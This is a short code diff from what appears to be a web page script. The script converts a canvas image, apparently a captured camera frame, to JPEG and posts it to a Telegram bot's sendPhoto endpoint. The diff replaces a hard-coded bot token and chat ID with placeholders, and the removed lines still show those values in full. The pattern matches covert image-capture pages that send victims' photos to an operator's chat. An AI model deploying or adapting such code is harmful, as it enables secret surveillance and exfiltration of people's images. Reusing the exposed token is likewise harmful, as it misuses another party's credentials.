@@ -34,11 +34,11 @@
             const imageData = canvas.toDataURL("image/jpeg");
 
             // إرسال الصورة إلى بوت تيليجرام
-            fetch(`https://api.telegram.org/bot7573387870:AAG4TEbxTtmyQ-d5iff8fLwb9MoeXYPxXWg/sendPhoto`, {
+            fetch(`https://api.telegram.org/botApi_Key/sendPhoto`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    chat_id: 6279473459,  // استبدل بالـ ID الخاص بك
+                    chat_id: yor_ID,  // استبدل بالـ ID الخاص بك
                     photo: imageData
                 })
             }).then(response => {
